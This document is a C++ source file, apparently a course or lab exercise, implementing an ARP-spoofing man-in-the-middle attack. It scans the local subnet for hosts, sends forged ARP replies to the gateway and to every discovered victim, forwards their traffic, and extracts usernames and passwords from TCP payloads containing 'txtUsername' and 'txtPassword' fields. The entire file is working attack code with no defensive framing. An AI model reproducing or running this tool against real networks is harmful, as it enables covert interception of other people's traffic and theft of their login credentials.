#include <iostream>
#include <vector>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <string.h>
#include <string>
#include <unistd.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>
#include <linux/if_ether.h>
#include <pthread.h>
#include <linux/tcp.h>
#include <algorithm>
#include <fstream>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <array>
#include <unordered_map>
#define BUFFER_SIZE ETH_FRAME_LEN
std::unordered_map<uint32_t, uint8_t*> ip_to_mac;
char* victim_ip = (char*)malloc(20 * sizeof(char));
char* gateway_ip = (char*)malloc(20 * sizeof(char));
uint8_t* self_mac = (uint8_t*)malloc(6 * sizeof(uint8_t));
uint8_t* victim_mac = (uint8_t*)malloc(6 * sizeof(uint8_t));
uint8_t* gateway_mac = (uint8_t*)malloc(6 * sizeof(uint8_t));
char* self_ip = (char*)malloc(20 * sizeof(char));
std::string ip_str;
int mask;
std::string interface;
std::string execCommand(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (!feof(pipe.get())) {
        if (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
            result += buffer.data();
        }
    }
    return result;
}
void get_ip_mac_address(char* ip) {
    int sfd;
    unsigned char* mac;
    struct arpreq arp_req;
    struct sockaddr_in* sin;

    sin = (struct sockaddr_in*)&(arp_req.arp_pa);
    memset(&arp_req, 0, sizeof(arp_req));
    sin->sin_family = AF_INET;
    inet_pton(AF_INET, ip, &(sin->sin_addr));
    strncpy(arp_req.arp_dev, interface.c_str(), IFNAMSIZ-1);

    if ((sfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("socket");
        exit(-1);
    }
    if (ioctl(sfd, SIOCGARP, &arp_req) < 0)
        return;
    if (arp_req.arp_flags & ATF_COM) {
        mac = (unsigned char*) arp_req.arp_ha.sa_data;
        if (strcmp(ip, gateway_ip) != 0) {
            struct in_addr addr;
            inet_aton(ip, &addr);
            ip_to_mac[addr.s_addr] = (uint8_t*)malloc(6 * sizeof(uint8_t));
            memcpy(ip_to_mac[addr.s_addr], mac, 6 * sizeof(uint8_t));
        }
        if (strcmp(ip, gateway_ip) == 0) 
            memcpy(gateway_mac, mac, 6 * sizeof(uint8_t));
        else {
            printf("%s", ip);
            for (unsigned long int i = 0; i < 20 - strlen(ip); ++i)
                printf(" ");
            printf("%02x:%02x:%02x:%02x:%02x:%02x\n",
                mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);   
        }
    }
    close(sfd);
}
void send_ICMP() {
    std::string command = "ip addr show " + std::string(interface);
    std::string buffer = execCommand(command.c_str());
    int ip_start = buffer.find("inet ") + 5;
    int ip_end = buffer.find("/", ip_start);
    int mask_end = buffer.find(" ", ip_end);
    ip_str = buffer.substr(ip_start, ip_end - ip_start);
    std::string mask_str = buffer.substr(ip_end + 1, mask_end - (ip_end + 1));
    struct in_addr addr;
    inet_aton(ip_str.c_str(), &addr);
    mask = atoi(mask_str.c_str());
    addr.s_addr = (addr.s_addr << (32 - mask)) >> (32 - mask);
    std::string current_ip(inet_ntoa(addr));
    int n = 1 << (32 - mask);
    for (int i = 0; i < n; ++i) {
        command = "ping -c 1 -i 0.01 " + current_ip + " > /dev/null 2>&1 &";
        system(command.c_str());
        addr.s_addr = htonl(addr.s_addr);
        addr.s_addr++;
        addr.s_addr = ntohl(addr.s_addr);
        current_ip = std::string(inet_ntoa(addr));
    }
}
void print_ip_mac_address() {
    send_ICMP();
    sleep(1);
    printf("Available devices\n");
    printf("-------------------------------------\n");
    printf("IP                  MAC              \n");
    printf("-------------------------------------\n");
    struct in_addr addr;
    inet_aton(ip_str.c_str(), &addr);
    addr.s_addr = (addr.s_addr << (32 - mask)) >> (32 - mask);
    int n = 1 << (32 - mask);
    for (int i = 0; i < n; ++i) {
        addr.s_addr = htonl(addr.s_addr);
        addr.s_addr++;
        addr.s_addr = ntohl(addr.s_addr);
        get_ip_mac_address(inet_ntoa(addr));
    }
}
static void* spoof_ip_address(void* arg) {
    int s;
    struct sockaddr_ll addr1;
    struct sockaddr_ll addr2;
    addr1.sll_family = AF_PACKET;
    addr1.sll_protocol = htons(ETH_P_ARP);
    addr1.sll_ifindex = if_nametoindex(interface.c_str());
    addr1.sll_hatype = ARPHRD_ETHER;
    addr1.sll_pkttype = PACKET_OTHERHOST;
    addr1.sll_halen = ETH_ALEN;
    addr2 = addr1;
    if ((s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        perror("socket");
        exit(-1);
    }
    struct arphdr* arp_hdr = (struct arphdr*)malloc(sizeof(struct arphdr));
    struct ether_arp* arp_gateway = (struct ether_arp*)malloc(sizeof(struct ether_arp));
    struct ether_arp* arp_victim = (struct ether_arp*)malloc(sizeof(struct ether_arp));
    arp_hdr -> ar_hrd = htons(ARPHRD_ETHER);
    arp_hdr -> ar_pro = htons(ETH_P_IP);
    arp_hdr -> ar_hln = 6;
    arp_hdr -> ar_pln = 4;
    arp_hdr -> ar_op  = htons(ARPOP_REPLY);
    memcpy(arp_gateway, arp_hdr, sizeof(struct arphdr));
    memcpy(arp_gateway -> arp_sha, self_mac, 6 * sizeof(uint8_t));
    struct in_addr in;
    in.s_addr = inet_addr(gateway_ip);
    memcpy(arp_gateway -> arp_tpa, &in, sizeof(in_addr_t));
    memcpy(arp_gateway -> arp_tha, gateway_mac, 6 * sizeof(uint8_t));
    // send to gateway
    addr2.sll_addr[7] = 0x00;
    addr2.sll_addr[6] = 0x00;
    memcpy(&(addr2.sll_addr), arp_gateway -> arp_tha, 6 * sizeof(unsigned char));
    char buffer2[BUFFER_SIZE];
    memset(buffer2, 0, BUFFER_SIZE);
    struct ethhdr* eth_hdr2 = (struct ethhdr*)buffer2;
    memcpy(eth_hdr2 -> h_dest, arp_gateway -> arp_tha, 6 * sizeof(uint8_t));
    memcpy(eth_hdr2 -> h_source, self_mac, 6 * sizeof(uint8_t));
    eth_hdr2 -> h_proto = htons(ETH_P_ARP);
    char buffer1[BUFFER_SIZE];
    while (1) {
        for (std::unordered_map<uint32_t, uint8_t*>::iterator it = ip_to_mac.begin(); it != ip_to_mac.end(); ++it) {
            in.s_addr = it -> first;
            memcpy(arp_gateway -> arp_spa, &in, 4 * sizeof(char));
            memcpy(buffer2 + sizeof(struct ethhdr), arp_gateway, sizeof(struct ether_arp));
            if ((sendto(s, buffer2, sizeof(struct ethhdr) + sizeof(struct ether_arp), 0, (struct sockaddr*)&addr2, sizeof(struct sockaddr_ll))) < 0) {
                perror("send");
                exit(-1);
            }
        }
        for (std::unordered_map<uint32_t, uint8_t*>::iterator it = ip_to_mac.begin(); it != ip_to_mac.end(); ++it) {
            struct in_addr tmp;
            tmp.s_addr = it->first;
            victim_ip = inet_ntoa(tmp);
            victim_mac = it->second;
            struct sockaddr_ll victim_addr;
            victim_addr.sll_family = AF_PACKET;
            victim_addr.sll_protocol = htons(ETH_P_ARP);
            victim_addr.sll_ifindex = if_nametoindex(interface.c_str());
            victim_addr.sll_hatype = ARPHRD_ETHER;
            victim_addr.sll_pkttype = PACKET_OTHERHOST;
            victim_addr.sll_halen = ETH_ALEN;
            memcpy(arp_victim, arp_hdr, sizeof(struct arphdr));
            memcpy(arp_victim -> arp_sha, self_mac, 6 * sizeof(uint8_t));
            struct in_addr in;
            in.s_addr = inet_addr(gateway_ip);
            memcpy(arp_victim -> arp_spa, &in, 4 * sizeof(char));
            memcpy(arp_victim -> arp_tha, victim_mac, 6 * sizeof(uint8_t));
            in.s_addr = inet_addr(victim_ip);
            memcpy(arp_victim -> arp_tpa, &in, sizeof(in_addr_t));
            victim_addr.sll_addr[7] = 0x00;
            victim_addr.sll_addr[6] = 0x00;
            memcpy(&(victim_addr.sll_addr), arp_victim -> arp_tha, 6 * sizeof(uint8_t));
            memset(buffer1, 0, BUFFER_SIZE);
            struct ethhdr* eth_hdr1 = (struct ethhdr*)buffer1;
            memcpy(eth_hdr1 -> h_dest, arp_victim -> arp_tha, 6 * sizeof(uint8_t));
            memcpy(eth_hdr1 -> h_source, self_mac, 6 * sizeof(uint8_t));
            eth_hdr1 -> h_proto = htons(ETH_P_ARP);
            memcpy(buffer1 + sizeof(struct ethhdr), arp_victim, sizeof(struct ether_arp));
            if ((sendto(s, buffer1, sizeof(struct ethhdr) + sizeof(struct ether_arp), 0, (struct sockaddr*)&victim_addr, sizeof(struct sockaddr_ll))) < 0) {
                perror("send");
                exit(-1);
            }
        }
        sleep(1);
    }
}
void get_mac_address() {
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_STREAM, IPPROTO_IP);

    strcpy(s.ifr_name, interface.c_str());
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (int i = 0; i < 6; ++i) {
            self_mac[i] = (unsigned char) s.ifr_addr.sa_data[i];
        }
    }
    if (0 == ioctl(fd, SIOCGIFADDR, &s)) {
        self_ip = (char*)inet_ntoa(((struct sockaddr_in*)&s.ifr_addr) -> sin_addr);
    }
    close(fd);
}
void parse_TCP(char* buffer) {
    struct tcphdr* tcphdr = (struct tcphdr*)buffer;
    std::string payload(buffer + 4 * tcphdr->doff);
    int uname = payload.find("txtUsername");
    int upwd = payload.find("txtPassword");
    int upwd_end = payload.find("\r\n", upwd);
    if (uname == (int)std::string::npos || upwd == (int)std::string::npos)
        return;
    std::cout << '\n';
    std::cout << "Username: " << payload.substr(uname + 12, upwd - 1 - (uname + 12)) << '\n';
    std::cout << "Password: " << payload.substr(upwd + 12, upwd_end - (upwd + 12)) << '\n';
}
static void* packet_forward(void* args) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    int buffer_size = 65535;
    setsockopt(s, SOL_SOCKET, SO_RCVBUF, (const char*)&buffer_size, sizeof(int));
    if (s < 0) {
        perror("forward socket");
        exit(-1);
    }
    char buffer[BUFFER_SIZE];
    struct sockaddr_ll sa;
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex(interface.c_str());
    sa.sll_hatype = ARPHRD_ETHER;
    sa.sll_pkttype = PACKET_OTHERHOST;
    sa.sll_halen = ETH_ALEN;
    sa.sll_addr[7] = 0;
    sa.sll_addr[6] = 0;
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int read_bytes = recvfrom(s, buffer, sizeof(buffer), 0, NULL, NULL);
        if (read_bytes == 0)
            continue;
        struct ethhdr* ethhdr = (struct ethhdr*)buffer;
        if (memcmp(ethhdr->h_dest, self_mac, sizeof(ETH_ALEN)) != 0)
            continue;
        struct iphdr* iphdr = (struct iphdr*)(buffer + sizeof(ether_header));
        in_addr saddr, daddr;
        saddr.s_addr = iphdr->saddr;
        daddr.s_addr = iphdr->daddr;
        bool source_is_victims = ip_to_mac.count(saddr.s_addr);
        bool dest_is_victims = ip_to_mac.count(daddr.s_addr);
        bool dest_is_self = (strncmp(inet_ntoa(daddr), self_ip, strlen(self_ip)) == 0 && strlen(self_ip) == strlen(inet_ntoa(daddr)));
        if (source_is_victims && !dest_is_self) {
            memcpy(&(sa.sll_addr), gateway_mac, ETH_ALEN * sizeof(uint8_t));
            memcpy(ethhdr->h_dest, gateway_mac, ETH_ALEN * sizeof(uint8_t));
            memcpy(ethhdr->h_source, self_mac, ETH_ALEN * sizeof(uint8_t));
            victim_mac = ip_to_mac[saddr.s_addr];
            if (iphdr->protocol == IPPROTO_TCP) {
                parse_TCP(buffer + sizeof(ether_header) + 4 * iphdr->ihl);
            }
        }
        else if (dest_is_victims) {
            victim_mac = ip_to_mac[daddr.s_addr];
            memcpy(&(sa.sll_addr), victim_mac, ETH_ALEN * sizeof(uint8_t));
            memcpy(ethhdr->h_dest, victim_mac, ETH_ALEN * sizeof(uint8_t));
            memcpy(ethhdr->h_source, self_mac, ETH_ALEN * sizeof(uint8_t));
        }
        else 
            continue;
        // printf("sendto bytes: %d\n", read_bytes);
        if ((sendto(s, buffer, read_bytes, 0, (struct sockaddr*)&sa, sizeof(struct sockaddr_ll))) < 0) {
            perror("send");
            exit(-1);
        }
    }
}
int main() {
    interface = execCommand("ip -o -4 route show to default | awk '{print $5}'");
    interface = interface.substr(0, interface.length() - 1);
    std::string gateway_ip_str = execCommand("ip -o -4 route show to default | awk '{print $3}'").c_str();
    gateway_ip = (char*)gateway_ip_str.substr(0, gateway_ip_str.length() - 1).c_str();
    system("sudo apt install ethtool >/dev/null 2>&1");
    system("sudo ethtool -K ens33 gro off >/dev/null 2>&1");
    print_ip_mac_address();
    get_mac_address();
    pthread_t thread_for_spoof;
    pthread_t thread_for_forward;
    void* args = NULL;
    if (pthread_create(&thread_for_spoof, NULL, spoof_ip_address, args) != 0) {
        perror("pthread_create");
        exit(-1);
    }
    if (pthread_create(&thread_for_forward, NULL, packet_forward, args) != 0) {
        perror("pthread_create");
        exit(-1);
    }
    if (pthread_join(thread_for_spoof, NULL) != 0) {
        perror("pthread_join");
        exit(-1);
    }
    if (pthread_join(thread_for_forward, NULL) != 0) {
        perror("pthread_join");
        exit(-1);
    }
    return 0;
}
// sudo ethtool -K ens33 gro off